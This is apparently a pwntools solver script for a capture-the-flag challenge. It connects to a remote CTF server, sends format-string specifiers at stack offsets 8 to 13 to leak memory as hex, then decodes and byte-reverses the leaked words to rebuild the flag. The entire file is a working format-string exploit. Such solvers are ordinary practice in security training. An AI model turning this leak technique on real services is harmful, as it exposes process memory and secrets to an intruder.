from pwn import *

# This will automatically get context arch, bits, os etc
elf = context.binary = ELF('./src/chall', checksec=False)
context.log_level = "critical"

flag_list_hex = list()
# Let's fuzz 100 values
for i in range(8,14):
    try:
        # Create process (level used to reduce noise)
        # p = process(level='error')
        p = remote('ctf.tcp1p.com', 3587)
        # When we see the user prompt '>', format the counter
        # e.g. %2$s will attempt to print second pointer as string
        p.sendlineafter(b"What's that?", '%{}$lX'.format(i).encode())
        # Receive the response
        p.recvuntil(b'what? ')
        result = p.recvline()
        # Check for flag
        # if("flag" in str(result).lower()):
        print(str(i) + ': ' + str(result.strip().decode()))
        flag_list_hex.append(result.strip().decode())
        # Exit the process
        p.close()
    except EOFError:
        pass

# flag = list()
# for f in flag_list_hex:
#     flag.append(list(bytes.fromhex(f).decode())[::-1])

# for j in flag:
#     a = "".join(j)
#     print(a, end="")
flag = "".join("".join(list(bytes.fromhex(f).decode())[::-1]) for f in flag_list_hex)
print(flag, end="")
